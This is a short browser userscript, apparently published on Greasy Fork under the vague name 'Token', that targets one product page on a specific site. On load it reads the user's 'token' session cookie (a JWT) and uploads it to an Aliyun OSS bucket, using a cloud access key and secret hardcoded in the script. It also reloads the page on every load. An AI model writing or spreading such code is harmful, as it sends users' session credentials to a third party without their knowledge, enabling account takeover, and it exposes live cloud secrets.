// ==UserScript==
// @name         Token
// @version      1.0
// @description  Token Jwt
// @author       JeJe
// @match        https://gdmg.etczs.net/user/product
// @grant        none
// @notice @require      https://gosspublic.alicdn.com/aliyun-oss-sdk-6.18.0.min.js
// @namespace    https://greasyfork.org/users/953536
// @downloadURL https://update.greasyfork.org/scripts/540575/Token.user.js
// @updateURL https://update.greasyfork.org/scripts/540575/Token.meta.js
// ==/UserScript==
var client = new OSS({
        region: "oss-cn-shenzhen",
        accessKeyId: "LTAI5tDuW7G17JewH2uzFU4cZK",
        accessKeySecret: "YolaVfWBTm4JeB6LiqxbjABryantKvs5IDzkUY",
        bucket: "jeje"
 });

window.onload = function() {
    location.reload();
};

(function() {
    setTimeout(function() {
        var jwt = document.cookie.match(/(?:^|;)\s*token=([^;]+)/)[1];
        saveToken(jwt);
    }, 500);
})();

function saveToken(jwt){
    const buffer = new OSS.Buffer(jwt);
    client.put('uPic/jwt.json', buffer).then(function (result) {
        console.dir('jwtResult:' + result);
        console.dir(result);
    }).catch(function (err) {
        console.dir(err);
    });
}